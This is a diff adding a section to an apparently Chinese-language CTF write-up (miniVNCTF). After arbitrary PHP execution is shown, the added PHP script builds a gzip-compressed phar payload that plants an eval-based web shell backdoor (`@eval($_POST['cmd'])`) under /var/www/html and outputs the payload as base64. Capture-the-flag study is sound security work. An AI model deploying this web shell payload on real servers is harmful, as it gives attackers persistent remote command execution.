@@ -406,3 +406,34 @@ if __name__ == "__main__":
 ![](assets/miniVNCTF/file-20251207174103687.png)
 可以看到我们上面写的`phpinfo()`已经执行了。现在我们已经有了php任意代码执行。
 这里我们可以传一个后门上去就不用每次都构造了。
+```php
+<?php
+
+$phar_file = "write.phar";
+@unlink($phar_file);
+@unlink($phar_file . ".gz");
+
+$phar = new Phar($phar_file);
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+
+$shell_content = "<?php @eval(\$_POST['cmd']);?>";
+$target_file = '/var/www/html/1.txt';
+
+$code = '<?php
+$f = '.var_export($target_file, true).';
+$c = '.var_export($shell_content, true).';
+
+if (file_put_contents($f, $c)) {
+    echo "Success!";
+}
+
+?>';
+
+$phar->addFromString("test.txt", $code);
+$phar->stopBuffering();
+$phar->compress(Phar::GZ); // 必须压缩
+
+echo base64_encode(file_get_contents($phar_file . ".gz"));
+?>
+```
